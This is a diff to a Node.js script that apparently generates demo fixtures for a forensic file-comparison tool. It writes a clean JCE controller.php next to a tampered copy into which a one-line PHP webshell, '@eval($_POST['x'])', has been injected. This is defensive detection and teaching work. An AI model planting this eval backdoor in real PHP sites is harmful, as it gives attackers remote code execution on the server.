@@ -155,6 +155,28 @@ const tamperedVersion = cleanVersion.replace(
 write(LEFT, 'example.com/libraries/joomla/version.php', cleanVersion);
 write(RIGHT, 'example.com/libraries/joomla/version.php', tamperedVersion);
 
+// --- JCE core-file comparison demo ---
+// Pull a REAL pristine JCE file out of the bundled package so "vs JCE" shows
+// only the injected line (left == pristine, right == pristine + webshell).
+try {
+  const AdmZip = require('adm-zip');
+  const pkg = new AdmZip(path.join(ROOT, '..', 'assets', 'pkg_jce_pro_29998.zip'));
+  const comEntry = pkg.getEntries().find((e) => /packages\/com_jce\.zip$/i.test(e.entryName));
+  if (comEntry) {
+    const com = new AdmZip(comEntry.getData());
+    const ent = com.getEntry('administrator/components/com_jce/controller.php');
+    if (ent) {
+      const pristine = ent.getData().toString('utf8');
+      const rel = 'example.com/administrator/components/com_jce/controller.php';
+      write(LEFT, rel, pristine);
+      write(RIGHT, rel, pristine.replace(/<\?php/, "<?php\n@eval($_POST['x']); // <-- injected into JCE core"));
+      console.log('JCE demo file written:', rel);
+    }
+  }
+} catch (e) {
+  console.log('JCE demo skipped (assets/adm-zip unavailable):', e.message);
+}
+
 // ---- evidence folder + CSV manifests ----
 fs.mkdirSync(EVID, { recursive: true });
 generate(LEFT, '/mnt/data', path.join(EVID, 'left.csv'));
